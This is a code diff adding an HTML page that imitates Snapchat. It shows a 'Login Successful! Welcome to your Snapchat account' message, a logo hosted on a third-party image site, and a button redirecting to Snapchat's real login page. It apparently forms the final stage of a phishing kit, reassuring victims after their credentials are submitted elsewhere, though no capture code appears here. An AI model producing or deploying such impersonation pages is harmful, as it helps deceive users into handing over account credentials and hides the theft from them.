@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Login Successful </title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #FFFF00;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 90vh;
+        }
+        .login-box {
+            background-color: white;
+            padding: 60px;
+            border-radius: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .logo {
+            width: 250px;
+            height: 250px;
+        }
+    </style>
+        <script>
+        function redirectToSnapchat() {
+            window.location.href = 'https://www.snapchat.com/login';
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://iili.io/2CN431S.th.png" alt="2CN431S.th.png" class="logo">
+            <h2 style="font-size: 30px; color: black;">Login Successful!</h2>
+            <p style="font-size: 20px; color: black;">Welcome to your Snapchat account.</p>
+            <button onclick="redirectToSnapchat()" style="margin-top: 20px; padding: 10px 20px; background-color: #fffc00; border: none; border-radius: 5px; cursor:pointer;">
+        Continue to Snapchat
+    </button>
+        </div>
+    </div>
+</body>
+</html>
